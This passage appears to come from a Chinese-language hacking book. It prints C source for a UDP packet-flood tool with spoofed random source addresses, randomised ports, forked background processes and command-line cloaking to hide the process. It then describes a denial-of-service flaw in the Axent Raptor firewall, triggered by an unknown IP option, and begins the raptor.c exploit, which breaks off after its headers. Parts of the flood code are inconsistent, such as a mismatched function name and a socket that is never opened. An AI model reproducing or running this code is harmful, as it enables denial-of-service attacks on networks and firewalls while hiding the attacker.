

## 解析函数

```c
unsigned long resolve(char *cp)
{
    struct hostent *hp;

    hp = gethostbyname(cp);
    if (!hp) {
        printf("[*] Unable to resolve %s\t\n", cp);
        exit(EXIT_FAILURE);
    }
    return ((unsigned long) hp->h_addr);
}

void resolvedest (void)
{
    struct hostent *host;

    memset(&dstaddr, 0, sizeof(struct sockaddr_in));
    dstaddr.sin_family = AF_INET;
    dstaddr.sin_addr.s_addr = inet_addr(target);
    if (dstaddr.sin_addr.s_addr == -1) {
        host = gethostbyname(target);
        if (host == NULL) {
            printf("[*] Unable To resolve %s\t\n", target);
            exit(EXIT_FAILURE);
        }
        dstaddr.sin_family = host->h_addrtype;
        memcpy((caddr_t) & dstaddr.sin_addr, host->h_addr, host->h_length);
    }
    memcpy(&dst, (char *) &dstaddr.sin_addr.s_addr, 4);
}
```

## 解析参数

```c
void parse_args(int argc, char *argv[])
{
    int opt;

    while ((opt = getopt(argc, argv, "x:s:d:n:p:w:o:f:")) != -1)
        switch (opt) {
            case 's':
                srchost = (char *) malloc(strlen(optarg) + 1);
                strcpy(srchost, optarg);
                break;
            case 'x':
                stealth = (char *) malloc(strlen(optarg));
                strcpy (stealth, optarg);
                break;
            case 'd':
                dsport = atoi(optarg);
                break;
            case 'n':
                numpacks = atoi(optarg);
                break;
            case 'p':
                psize = atoi(optarg);
                break;
            case 'w':
                wait = atoi(optarg);
                break;
            case 'o':
                srcport = atoi(optarg);
                break;
            case 'f':
                forknum = atoi(optarg);
                break;
            default:
                usage (argv[0]);
        }
    if (!stealth)
        stealth = Default_Stealth;
    if (!forknum)
        forknum = Default_Fork;
    if (!argv[optind]) {
        printf ("\n\n%s[%s*%s]%%s Bzzzt .. We need a Place for the Packets to Go%s\n",DC,W,DC,DR,RESTORE);
        exit (EXIT_FAILURE);
    }
    target = (char *) malloc (strlen (argv[optind]));
    if (!target) {
        printf ("\n\n%s[%s*%s]%%s Unable to Allocate Required Amount of Memory for Task%s\n",DC,W,DC,DR,RESTORE);
        perror ("malloc");
        exit (EXIT_FAILURE);
    }

    strcpy (target, argv[optind]);
}

int cloaking (int argc, char *argv[])
{
    int x;

    for (x = argc-1; x >= 0; x--)
        memset (argv[x], 0, strlen (argv[x]));
    strcpy (argv[0],stealth);
    return(0);
}
```

## 发送数据包

```c
void main(int argc, char *argv[])  
{
int q, xx, sen, i, unlim = 0, sec_check;
char *packet;

banner();

if (argc < 2)
    usage(argv[0]);

parse_args(argc, argv);

cloaking(argc, argv);

resolveDest();

printf("\n\n%s  [%s*%s]%s  Target Host%s      :%s %s\n",DC,W,DC,DR,DC,DW,target,RESTORE);
if (!srchost)
    printf("%s  [%s*%s]%s  Source Host%s     :%s Random%s\n",DC,W,DC,DR,DC,DW,RESTORE);
else
    printf("%s  [%s*%s]%s  Source Host%s      :%s %s %s\n",DC,W,DC,DR,DC,DW,srchost,RESTORE);

if (!numpacks)
    printf("%s  [%s*%s]%s  Number%s           :%s Infinite%s\n",DC,W,DC,DR,DC,DW,RESTORE);
else
    printf("%s  [%s*%s]%s  Number%s           :%s %d%s\n",DC,W,DC,DR,DC,DW,numpacks,RESTORE);
if (!psize)
    printf("%s  [%s*%s]%s  Packet Size%s       :%s 1 - %d bytes%s\n",DC,W,DC,DR,DC,DW,Packet_Max,RESTORE);
else
    printf("%s  [%s*%s]%s  Packet Size%s       :%s %d%s\n",DC,W,DC,DR,DC,DW,psize,RESTORE);
if (!wait)
    printf("%s  [%s*%s]%s  Wait Time%s         :%s 0 - %dms%s\n",DC,W,DC,DR,DC,DW,Frequency_Max,RESTORE);
else
    printf("%s  [%s*%s]%s  Wait Time%s         :%s %dms%s\n",DC,W,DC,DR,DC,DW,wait,RESTORE);
if (!dsport)
    printf("%s  [%s*%s]%s  Destination Port%s   :%s Random%s\n",DC,W,DC,DR,DC,DW,RESTORE);
else
    printf("%s  [%s*%s]%s  Destination Port%s   :%s %d%s\n",DC,W,DC,DR,DC,DW,dsport,RESTORE);
if (!srcport)
    printf("%s    [%s*%s]%s    Source Port%s                    :%s Random%s\n",DC,W,DC,DR,DC,DW,RESTORE);
else
    printf("%s    [%s*%s]%s    Source Port%s                    :%s %d%s\n",DC,W,DC,DR,DC,DC,srcport,RESTORE);
printf("%s    [%s*%s]%s    Backgrounded%s :%s %d%s\n",DC,W,DC,DR,DC,DW,forknum,RESTORE);
if (!stealth)
    printf("%s    [%s*%s]%s    Masked As%s                     :%s %s%s\n",DC,W,DC,DR,DC,DW,Default_Stealth,RESTORE);
else
    printf("%s    [%s*%s]%s    Masked As%s                     :%s %s%s\n",DC,W,DC,DR,DC,DW,stealth,RESTORE);

if (forknum) {
    switch(fork()) {
        case -1:
            printf("%s    [%s*%s]%s Your OS cant Make the fork() call as we need it",DC,W,DC,DR,RESTORE);
            printf("%s    [%s*%s]%s This is usually an indication of something bad%s",DC,W,DC,DR,RESTORE);
            exit(1);
        case 0:
            break;
        default:
            forknum--;
            for (xx=0;xx<forknum;xx++) {
                switch(fork()){
                    case -1:
                        printf("%s    [%s*%s]%s Unable to fork%s\n",DC,W,DC,DR,RESTORE);
                        printf("%s    [%s*%s]%s This is usually an indication of something bad%s",DC,W,DC,DR,RESTORE);
                        exit(1);
                    case 0:
                        xx=forknum;
                        break;
                    default:
                        if (xx==forknum-1) {
                            printf("%s    [%s*%s]%s Process Backgrounded%s\n",DC,W,DC,DR,RESTORE);
                            exit(0);
                        }
                        break;
                }
            }
    }
}

packet = (char *) malloc(sizeof(struct iphdr) + sizeof(struct udphdr) + psize);
ip = (struct iphdr *) packet;
udp = (struct udphdr *) (packet + sizeof(struct iphdr));
memset(packet, 0, sizeof(struct iphdr) + sizeof(struct udphdr) + psize);

if (!numpacks) {
    unlim++;
    numpacks++;
}
if (srchost && *srchost)
    ip->saddr = resolve(srchost);
ip->daddr = dst;
ip->version = 4;
ip->ihl = 5;
ip->ttl = 255;
ip->protocol = IPPROTO_UDP;
ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + psize);
ip->check = in_cksum(ip, sizeof(struct iphdr));

udp->source = htons(srcport);
udp->dest = htons(dsport);
udp->len = htons(sizeof(struct udphdr) + psize);

/*
* Because we like to be Original Seeding rand() with something
* as unique as time seemed groovy. Lets have a loud Boo for Patter Loggers.
*/

srand(time(0));

for (i = 0; i < numpacks; (!unlim) ? i++ : i++) {
    if (!srchost)
        ip->saddr = rand();
    if (!dsport)
        udp->dest = htons(rand()%Port_Max+1);
    if (!srcport)
        udp->source = htons(rand()%Port_Max+1);
    if (!psize)
        udp->len = htons(sizeof(struct udphdr) + rand()%Packet_Max);

    if (sendto(sen, packet, sizeof(struct iphdr) + sizeof(struct udphdr) + psize,
        0, (struct sockaddr *) &dstaddr,
        sizeof(struct sockaddr_in)) == (-1)) {
        printf("%s[%s*%s]%s Error sending Packet%s",DC,W,DC,DR,RESTORE);
        perror("SendPacket");
        exit(EXIT_FAILURE);
    }
    if (!wait)
        usleep(rand() %Frequency_Max);
    else
        usleep(wait);
}
```

## Raptor 防火墙

Axent Raptor 防火墙（www.axent.com/raptorfirewall）为内部网络、互联网、内部网、移动计算区域以及远程办公室连接提供实时安全保护。Raptor 方案是首个被认证为 Windows NT 的 IPSEC 认证 VPN 服务器的方案。*Secure Computing Magazine* 的评审员给予了 NT 6.5 版本的 Raptor 防火墙满分五星的整体评分，并授予其“最佳购买奖”，重点突出了 Raptor 防火墙优秀的管理控制台（涵盖防火墙和 VPN）、其广泛而灵活的代理范围以及 Checkmark 认证。然而，与其他大多数安全防御机制一样，Raptor 防火墙也易于受到远程攻击。

## 责任范围

### 拒绝服务攻击

**概要：** 此漏洞允许远程攻击者利用 DoS 黑客手段潜在地锁死防火墙。

**黑客状态：** 系统崩溃。

**易受攻击性：** Raptor 6x，取决于配置。

**漏洞利用：** *raptor.c* 中的 DoS 攻击是通过在一个 IP 数据包中未编程的 IP 选项被发送至防火墙实现的。防火墙无法处理这个未知的 IP 选项，导致其停止响应。

raptor.c

```c
#define __FAVOR_BSD
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define SRC_IP                    htonl(0x0a000001) /* 10.0.0.1 */
#define TCP_SZ                    20
#define IP_SZ                     20
```

